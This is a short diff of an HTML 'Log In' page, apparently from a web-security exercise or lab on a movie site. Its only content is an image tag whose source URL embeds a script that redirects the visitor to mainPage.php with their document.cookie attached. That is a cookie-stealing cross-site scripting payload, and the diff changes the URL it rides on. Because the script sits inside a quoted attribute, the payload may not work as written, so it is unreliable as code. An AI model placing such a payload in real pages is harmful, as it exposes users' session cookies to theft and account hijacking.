@@ -11,7 +11,7 @@
     <title>Log In</title>
 </head>
 <body>
-    <img src = "movie_pictures/kung_fu_panda.jpg?ak=<script>
+    <img src = "mainPage.php?search=jurassic&ak=<script>
     document.location.replace('mainPage.php?' + document.cookie);</script>">
 </body>
 </html>
